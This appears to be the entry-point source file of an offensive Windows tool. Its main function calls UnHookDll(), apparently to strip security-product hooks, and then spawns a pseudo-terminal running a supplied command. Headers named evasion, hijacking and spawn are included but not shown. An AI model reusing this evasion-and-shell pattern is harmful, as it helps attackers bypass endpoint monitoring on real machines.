// main.cpp : This file contains the 'main' function. Program execution begins and ends there.

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error list window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

#include "evasion.h"
#include "hijacking.h"
#include "spawn.h"

int main(int argc, char* argv[])
{
    int iRes = -1;
    if (argc == 4)
    {
        int iRows = atoi(argv[2]);
        int iCols = atoi(argv[3]);
        UnHookDll();
        iRes = SUCCEEDED(SpawnPty(argv[1], iRows, iCols)) ? 0 : -1;
    }
    return iRes;
}


